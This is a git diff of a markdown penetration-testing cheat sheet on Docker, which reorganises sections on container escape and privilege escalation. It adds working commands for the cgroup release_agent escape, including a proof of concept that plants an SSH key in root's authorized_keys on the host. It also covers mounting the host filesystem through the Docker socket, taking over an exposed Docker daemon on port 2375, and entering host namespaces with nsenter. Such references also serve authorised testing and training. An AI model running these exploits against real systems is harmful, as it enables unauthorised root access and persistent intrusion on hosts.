@@ -127,12 +127,82 @@ $ docker build -t <NAME> .
 $ docker run -d --name <NAME> -p 80:80 <NAME>
 ```
 
-### Attacking Docker API
+### Control Groups (cgroup) Privilege Escalation
+
+> https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.
+
+#### Requirements
+
+* Already root inside a container
+* The container must be run with the SYS_ADMIN Linux capability
+* The container must lack an AppArmor profile, or otherwise allow the mount syscall
+* The cgroup v1 virtual filesystem must be mounted read-write inside the container
+
+#### Checking Capabilities
 
 ```c
-$ docker -H <RHOST>:2375 ps -a
-CONTAINER ID   IMAGE     COMMAND                  CREATED        STATUS                    PORTS     NAMES
-01ca084c69b7   alpine    "chroot /host bash -…"   11 hours ago   Exited (2) 11 hours ago             zealous_blackburn
+$ capsh --print
+```
+
+#### Vulnerability Indicator Flag
+
+```c
+--security-opt apparmor=unconfined --cap-add=SYS_ADMIN
+```
+
+#### Modified PoC by TryHackMe
+
+```c
+$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+$ echo 1 > /tmp/cgrp/x/notify_on_release
+$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+$ echo "$host_path/exploit" > /tmp/cgrp/release_agent
+$ echo '#!/bin/sh' > /exploit
+$ echo "cat /home/cmnatic/<FILE> > $host_path/<FILE>" >> /exploit
+$ chmod a+x /exploit
+$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+#### PoC for SSH Key Deployment
+
+```c
+mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
+echo 1 > /tmp/exploit/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/exploit/release_agent
+
+echo '#!/bin/sh' > /cmd
+echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
+```
+
+### Docker Socket Privilege Escalation
+
+#### Checking for Docker Socket
+
+```c
+$ ls -la /var/run | grep sock
+```
+
+#### Create a privileged Docker Container and mount the Host Filesystem
+
+```c
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+### Exposed Docker Daemon
+
+#### Checking for Misconfiguration
+
+```c
+$ curl http://<RHOST>:2375/version
+```
+
+#### Command Execution
+
+```c
+$ docker -H tcp://<RHOST>:2375 ps
 ```
 
 ```c
@@ -150,56 +220,18 @@ $ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
-### Container Escape through Privileged Containers
+### Abusing Namespaces
 
-#### Access Privileged Container
+#### Verify Environment
 
 ```c
-$ sudo docker exec -it --privileged -u root <CONTAINER> bash
+$ ps aux
 ```
 
-#### Mount available Files from the Host
+#### Exploitation via Namespace Enter (nsenter)
 
 ```c
-$ mkdir -p /mnt/<FOLDER>
-$ mount /dev/<FILE> /mnt/<FOLDER>/
-$ cd /mnt/<FOLDER>
-```
-
-### Container Escape by exploiting cgroups
-
-#### Requirements
-
-* Already root inside a container
-* The container must be run with the SYS_ADMIN Linux capability
-* The container must lack an AppArmor profile, or otherwise allow the mount syscall
-* The cgroup v1 virtual filesystem must be mounted read-write inside the container
-
-#### Vulnerability Indicator Flag
-
-```c
---security-opt apparmor=unconfined --cap-add=SYS_ADMIN
-```
-
-#### Script
-
-```c
-mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
-echo 1 > /tmp/exploit/x/notify_on_release
-host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-echo "$host_path/cmd" > /tmp/exploit/release_agent
-
-echo '#!/bin/sh' > /cmd
-echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
-chmod a+x /cmd
-sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
-```
-
-### Privilege Escalation
-
-```c
-$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
+$ nsenter --target 1 --mount --uts --ipc --net /bin/bash
 ```
   
 ## Docker-Compose
